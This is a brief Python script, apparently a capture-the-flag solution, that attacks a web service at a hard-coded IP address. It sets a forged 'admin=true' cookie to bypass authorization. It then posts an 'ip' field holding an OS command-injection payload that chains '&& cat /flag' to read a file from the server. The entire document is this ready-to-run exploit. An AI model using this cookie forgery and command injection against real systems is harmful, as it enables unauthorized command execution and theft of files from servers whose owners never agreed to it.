import requests

session = requests.Session()

data = {
	'ip': '127.0.0.1 2>&1 > /dev/null && cat /flag'
}

session.cookies.set('admin', 'true')

r = session.post('http://124.221.34.13:55566', data=data)

print(r.text)
